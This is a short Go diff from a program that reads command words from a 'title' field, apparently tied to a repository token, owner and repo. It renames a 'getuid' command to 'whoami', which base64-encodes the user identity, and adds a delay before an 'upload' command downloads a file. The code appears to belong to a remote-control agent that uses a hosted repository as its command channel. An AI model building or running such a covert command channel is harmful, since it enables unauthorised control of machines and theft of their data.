@@ -294,7 +294,7 @@ func main() {
 			}
 		}
 
-		if title != "" && strings.HasPrefix(title, "getuid") {
+		if title != "" && strings.HasPrefix(title, "whoami") {
 			result := getUID()
 			encoded := base64Encode(result)
 			fmt.Printf("Encoded result: %s\n", encoded)
@@ -314,6 +314,8 @@ func main() {
 		}
 
 		if title != "" && strings.HasPrefix(title, "upload") {
+			// 等待一会，不然好像会404
+			time.Sleep(3 * time.Second)
 			args := strings.Fields(title)
 			remote_file_name := args[2]
 			if err := downloadFile(token, owner, repo, remote_file_name); err != nil {
